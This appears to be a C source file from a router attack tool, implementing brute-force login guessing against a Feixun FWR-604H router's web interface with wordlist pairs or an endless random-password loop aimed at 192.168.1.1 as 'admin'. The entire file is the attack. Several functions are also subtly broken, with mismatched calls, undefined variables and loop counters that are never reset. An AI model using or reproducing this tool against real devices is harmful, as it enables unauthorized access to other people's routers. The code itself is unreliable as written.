#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../main.h"
#include "guess_username_password.h"
#include "router_type.h"

// from ../core/debug.h
extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmtstring, ...);
extern int DisplayInfo(const char *fmtstring, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmtstring, ...);

// from ../core/str.h
extern int FreeRandomPassword(char *password);
extern int GetRandomPassword(char **rebuf, unsigned int seed, const int length);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern int FreeSplitURLSpace(pSplitURLOutput p);
extern int ProcessFile(char *path, pCharHeader *output, int flag);
extern int FreeProcessFile(pCharHeader p);

// from ../core/http.h
extern size_t HTTPPostMethod(char **response, const char *url, const char *request, int debug_level);

// from ../core/base64.h
extern int FreeBase64Buff(char *message);
extern int Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
extern size_t Base64Decode(unsigned char **buffer, char *b64message);

static int UListPList(char *url, pCharHeader u_header, pCharHeader p_header)
{
    // username is a list and password is list too
    size_t u_len = u_header->length;
    size_t p_len = p_header->length;
    pCharNode u = u_header->next;
    pCharNode p = p_header->next;
    char *b64message;
    char *response;
    char send_buff[strlen(FEIXUN_FWR_604H_REQUEST_MODEL) + MAX_SEND_DATA_SIZE];
    char data_buff[MAX_SEND_DATA_SIZE];
    pSplitURLOutput sp;

    SplitURL(url, &sp);
    for (u_len; u_len > 0; u_len--)
    {
        for (p_len; p_len > 0; p_len--)
        {
            // base64
            memset(send_buff, 0, sizeof(send_buff));
            memset(data_buff, 0, sizeof(data_buff));
            Base64Encode(&b64message, p->username, strlen(p->username));

            // combined data now
            sprintf(data_buff, FEIXUN_FWR_604H_REQUEST_DATA_MODEL, u->username, b64message);
            sprintf(send_buff, FEIXUN_FWR_604H_REQUEST_MODEL, sp->host, url, strlen(data_buff), data_buff);

            // send now
            HTTPPostMethod(&response, url, send_buff, 0);
            DisplayInfo(response);
            FreeBase64Buff(b64message);
            p = p->next;
        }
        u = u->next;
    }
    FreeSplitURLSpace(sp);
    return 0;
}

static int UOnePRandom(const char *url, const char *username, unsigned int seed, const int length)
{
    // just one username and use random password

    char *password;
    char *b64message;
    char send_buff[strlen(FEIXUN_FWR_604H_REQUEST_MODEL) + MAX_SEND_DATA_SIZE];
    char data_buff[MAX_SEND_DATA_SIZE];
    pSplitURLOutput sp;
    SplitURL(url, sp);

    for (;;)
    {
        GetRandomPassword(&password, seed, length);

        // base64
        Base64Encode(&b64message, password, strlen(password));

        // combined data now
        sprintf(data_buff, FEIXUN_FWR_604H_REQUEST_DATA_MODEL, username, b64message);
        sprintf(send_buff, FEIXUN_FWR_604H_REQUEST_MODEL, sp->host, url, strlen(data_buff), data_buff);

        // send now
        char *response;
        //DisplayInfo("*********************");
        //DisplayInfo("url: %s", url);
        HTTPPostMethod(&response, url, send_buff, 0);
        DisplayInfo(response);
        FreeRandomPassword(password);
        FreeBase64Buff(b64message);
    }

    FreeSplitURLSpace(host, suffix);
}

int Attack_GuessUsernamePassword(pInput input)
{
    // start attack

    if (strlen(input->attack_mode_0_username_file_path) > 0)
    {
        // if path existed, ignore the usename
        pCharHeader u_header;
        ProcessFile(input->attack_mode_0_username_file_path, &u_header, 0);
        if (strlen(input->attack_mode_0_password_file_path) > 0)
        {
            pCharHeader p_header;
            ProcessFile(input->attack_mode_0_password_file_path, &p_header, 1);
            UListPList(input->address, u_header, p_header);
            FreeProcessFile(u_header);
            FreeProcessFile(p_header);
        }
        // else will never happen
    }
    else if (strlen(input->attack_mode_0_one_username) > 0)
    {
        // use one username
        UOnePRandom(input->address, input->attack_mode_0_one_username, (unsigned int)input->seed, input->random_password_length);
    }
    else
    {
        DisplayError("Input illegal");
        return -1;
    }

    return 0;
}

int main(void)
{

    // random password do job
    char test_rebuf_GetRandomPassword[BIG_BUFFER_SIZE];
    pInput test_input_GetRandomPassword = (pInput)malloc(sizeof(Input));
    test_input_GetRandomPassword->debug_level = 2;
    test_input_GetRandomPassword->seed = 10;
    test_input_GetRandomPassword->random_password_length = 8;

    GetRandomPassword(test_rebuf_GetRandomPassword, test_input_GetRandomPassword);
    DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "random password: %s", test_rebuf_GetRandomPassword);

    // base64 do job
    char *b64message;
    Base64Encode(&b64message, test_rebuf_GetRandomPassword, strlen(test_rebuf_GetRandomPassword));

    // combined data now
    char send_buff[strlen(FEIXUN_FWR_604H_REQUEST_MODEL) + MAX_SEND_DATA_SIZE];
    char *url = "http://192.168.1.1/login.asp";
    char *host;
    char *suffix;
    int port;

    char send_data_buff[MAX_SEND_DATA_SIZE];
    sprintf(send_data_buff, FEIXUN_FWR_604H_REQUEST_DATA_MODEL, "admin", b64message);

    SplitURL(const char *url, pSplitURLOutput *output);
    //DisplayInfo("%ld", strlen(send_data_buff));
    sprintf(send_buff, FEIXUN_FWR_604H_REQUEST_MODEL, host, url, strlen(send_data_buff), send_data_buff);
    //DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "Send:\n%s\n", send_buff);

    // send now
    char *response;
    //DisplayInfo("*********************");
    //DisplayInfo("url: %s", url);
    HTTPPostMethod(&response, url, send_buff, 0);
    DisplayInfo(response);

    FreeSplitURLSpace(host, suffix);

    return 0;
}